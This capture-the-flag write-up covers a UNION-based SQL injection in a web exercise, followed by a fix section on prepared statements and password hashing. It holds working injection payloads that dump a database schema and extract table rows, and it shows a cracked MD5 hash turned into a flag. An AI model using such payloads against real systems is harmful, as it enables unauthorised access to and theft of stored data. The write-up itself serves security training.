# How

SQL injections occur when untrusted user input is passed into a SQL query.
The resulting query can be modified to return other data, deleting tables, ...

In our case, the output of the query is reflected on the page, so we can
use a UNION injection to extract data.

Dump the schema:

```
id=9 UNION SELECT CONCAT(table_schema,table_name),column_name from information_schema.columns-- -
```

The `information_schema` table holds info about all databases.
Works with MySQL, PostgreSQL and MSSQL.

Extract data from the list_images table:

```
id=9 UNION SELECT url,comment FROM Member_images.list_images-- -
```

One of the rows shows how to get the flag:

```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

crack MD5 with `hashcat` -> albatroz -> sha256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Fix

- Don't use MD5 to hash passwords (use argon2 or bcrypt instead)
- Use prepared statements. Example in PHP:

```
$id = $_GET["id"];

$pdo = new PDO(
    dsn: "mysql:host=localhost;dbname=list_images;charset=utf-8;port=3306",
    username: "username",
    password: "password",
);
$stmt = $pdo->prepare("SELECT * FROM images WHERE id = ?");
$stmt->execute([$id]);
```
